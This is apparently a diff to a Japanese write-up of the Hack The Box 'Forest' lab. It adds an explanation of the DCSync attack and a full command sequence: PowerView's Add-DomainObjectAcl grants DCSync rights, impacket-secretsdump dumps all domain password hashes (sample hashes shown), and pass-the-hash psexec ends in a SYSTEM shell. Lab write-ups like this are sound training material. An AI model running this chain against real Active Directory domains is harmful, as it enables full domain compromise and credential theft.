@@ -144,7 +144,10 @@ svc-alfrescoが属すグループの一つACCOUNT OPERATORS(Account Operatorsの
 
 ![houn-2](https://user-images.githubusercontent.com/85237728/195856484-6212a1d5-9df1-45d4-ae2d-90681f5b7df0.png)
 
-WriteDaclのabuseとして、ユーザにDCSyncの権限を与えるという攻撃が考えられる。
+WriteDaclのabuseとして、ユーザにDCSyncの権限を与えるという攻撃が考えられる
+
+> DCSyncについて：Domain ControllerになりすましてDomain Controller配下のアカウントのパスワードハッシュを取得する攻撃。MS-DRSRというDomain Controller間でデータ複製に
+> 利用されるプロトコルを悪用する。Domain Controllerにデータの同期を要求してパスワードハッシュを得る。
 
 ACCOUNT OPERATORSのメンバはEXCHANGE WINDOWS PERMISSIONSグループに対してGenericAll（なんでもできる）なので、EXCHANGE WINDOWS PERMISSIONSに新規ユーザを追加する。
 そしてその追加した新規ユーザにDCSync権限を与える。
@@ -183,5 +186,43 @@ The command completed successfully.
 *Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" hacker /add
 The command completed successfully.
 ```
+そしたら、PowerView.ps1の`Add-DomainObjectAcl`でユーザhackerにDCSyncの権限を付与する：
 
+```
+*Evil-WinRM* PS C:\Users\svc-alfresco> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -PrincipalIdentity hacker -TargetIdentity 'DC=htb, DC=local' -Rights DCSync
+```
 
+ここまで済んだら、以下のようにユーザhackerに対して`secretsdump.py`を実行すれば全ドメインユーザのパスワードハッシュが得られる：
+```
+┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
+└─$ impacket-secretsdump -dc-ip 10.10.10.161 'htb.local/hacker:password@10.10.10.161' 
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+...
+```
+AdminのハッシュでPass-the-HashしてAdminのシェルを得る：
+```
+┌──(shoebill㉿shoebill)-[~/Forest_10.10.10.161]
+└─$ rlwrap impacket-psexec -dc-ip 10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file tEiyyqNF.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service IVKx on 10.10.10.161.....
+[*] Starting service IVKx.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
